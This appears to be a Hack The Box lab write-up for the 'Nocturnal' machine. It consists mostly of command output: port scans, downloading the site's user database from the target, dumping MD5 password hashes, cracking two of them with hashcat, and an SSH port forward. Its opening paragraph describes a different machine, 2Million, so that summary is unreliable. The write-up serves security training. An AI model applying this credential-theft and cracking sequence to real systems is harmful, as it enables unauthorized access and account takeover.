---
layout: post
title: HTB-Nocturnal
---

<p>In 2Million, we decoded a JS invite code to access the site, exploited an API to escalate to admin, injected commands for a reverse shell, found admin credentials, and gained root.</p>
<h2>Introduction</h2>

<pre>
nmap -p- -sV -sC 10.10.11.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 12:14 EDT
Nmap scan report for 10.10.11.64
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</pre>
<pre>
nmap -sC -sV -p- nocturnal.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 12:43 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds

</pre>

<pre>
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed. 
</pre>

<pre>
wget nocturnal.htb:8888/nocturnal_database.db
Prepended http:// to 'nocturnal.htb:8888/nocturnal_database.db'
--2025-07-06 06:45:57--  http://nocturnal.htb:8888/nocturnal_database.db
Resolving nocturnal.htb (nocturnal.htb)... 10.10.11.64
Connecting to nocturnal.htb (nocturnal.htb)|10.10.11.64|:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40960 (40K) [application/octet-stream]
Saving to: ‘nocturnal_database.db’

nocturnal_database.db                          100%[=================================================================================================>]  40.00K  --.-KB/s    in 0.02s   

2025-07-06 06:45:57 (2.31 MB/s) - ‘nocturnal_database.db’ saved [40960/40960]

</pre>
<pre>
python3 -m http.server 8888
</pre>
<pre>
sqlite3 nocturnal_database.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
</pre>
<pre>
sqlite> .tables
uploads  users  
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|test|098f6bcd4621d373cade4e832627b4f6
9|elja|ba2da7908a3c2802c888a56b3c80f5e6
10|admin222|c4cefc53ca414d25294fd23b8fccd356
11|admin/a|48f1ef10bf65bd1226ec66178626e7b2
12|w47chm4n|4341c0fe0d9f48b01c1b9f56e3a88a1c
13|Aion|5f4dcc3b5aa765d61d8327deb882cf99
</pre>
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 5 7600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0                                                                                                                                           
Maximum password length supported by kernel: 256                                                                                                                                         
                                                                                                                                                                                         
Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                             
Rules: 1                                                                                                                                                                                 

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5f4dcc3b5aa765d61d8327deb882cf99:password                 
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Sun Jul  6 06:51:27 2025 (3 secs)
Time.Estimated...: Sun Jul  6 06:51:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5754.6 kH/s (0.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 2/4 (50.00%) Digests (total), 2/4 (50.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 15%

</pre>

<pre>
ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb
</pre>
<pre>
ISPConfig Version: 3.2.10p1
</pre>